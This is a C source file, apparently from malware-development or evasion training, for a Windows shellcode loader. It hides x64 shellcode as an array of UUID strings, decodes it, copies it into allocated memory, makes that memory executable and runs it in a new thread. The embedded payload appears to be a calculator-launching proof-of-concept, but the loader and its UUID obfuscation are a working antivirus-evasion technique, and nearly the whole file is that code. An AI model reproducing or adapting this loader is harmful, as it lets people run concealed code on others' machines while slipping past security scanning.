#include "UUIDeobfuscation.h"

char* UuidArray[] = {
		"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
		"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
		"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
		"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
		"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
		"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C6300"
};




#define NumberOfElements 17

int main() {

	PBYTE	pDAddress = NULL;
	SIZE_T	sDSize = NULL;

	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDAddress, &sDSize))
		return -1;


	PBYTE pShellAddress = NULL;
	pShellAddress = VirtualAlloc(NULL, sDSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pShellAddress)
	{
		printf("[!] VirtualAlloc Failed with Error: %ld\n", GetLastError());
		return 1;
	}
	printf("size = %d\n\n", sDSize);

	for (int i = 0; i < sDSize; i++)
		pShellAddress[i] = pDAddress[i];

	printf("\n\n");
	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pShellAddress, sDSize, PAGE_EXECUTE_READWRITE, &dwOldProtection))
	{
		printf("[!] VirtualProtect Failed with Error: %ld\n", GetLastError());
		return 1;
	}
	HANDLE hThread = NULL;
	hThread = CreateThread(NULL, NULL, pShellAddress, NULL, 0, 0);
	printf("%d", hThread);
	if (hThread == NULL)
	{
		printf("[!] CreateThread Failed with Error: %ld\n", GetLastError());
		return 1;
	}

	// HeapFree(GetProcessHeap(), 0, pDAddress);
	VirtualFree(pDAddress, sDSize, MEM_DECOMMIT | MEM_RELEASE);

	WaitForSingleObject(hThread, INFINITE);

	return 0;
}
